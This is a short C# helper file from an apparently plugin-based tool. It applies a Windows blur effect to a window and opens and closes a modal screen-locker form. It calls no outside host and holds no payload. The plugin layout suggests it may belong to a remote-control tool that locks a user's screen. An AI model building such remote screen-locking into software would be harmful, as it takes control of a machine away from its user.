using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using static Plugin.Imports;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal static class Helpers
    {
		private const string screenLockerName = "BLRSCRL";
		internal static int SetAero10(IntPtr hwnd)
		{
			AccentPolicy accentPolicy = new AccentPolicy
			{
				AccentState = AccentState.ACCENT_ENABLE_BLURBEHIND,
				AccentFlags = 0,
				GradientColor = 0,
				AnimationId = 0
			};
			WindowCompositionAttributeData data = new WindowCompositionAttributeData { Attribute = WindowCompositionAttribute.WCA_ACCENT_POLICY };
			int accentSize = Marshal.SizeOf(accentPolicy);
			IntPtr accentPtr = Marshal.AllocHGlobal(accentSize);
			Marshal.StructureToPtr(accentPolicy, accentPtr, false);
			data.Data = accentPtr;
			data.SizeOfData = accentSize;
			int result = SetWindowCompositionAttribute(hwnd, ref data);
			Marshal.FreeHGlobal(accentPtr);
			return result;
		}

		internal static void StartScreenLocker()
		{
			if (Application.OpenForms[screenLockerName] == null)
			{
				ScreenLocker o = new ScreenLocker(screenLockerName);
				o.InitializeComponent();
				o.ShowDialog();
			}
		}

		internal static void StopScreenLocker()
		{
			PostMessage(Application.OpenForms[screenLockerName].Handle, WM_Message.WM_SYSCOMMAND, SC_Message.SC_CLOSE, IntPtr.Zero);
			return;
		}
	}
}
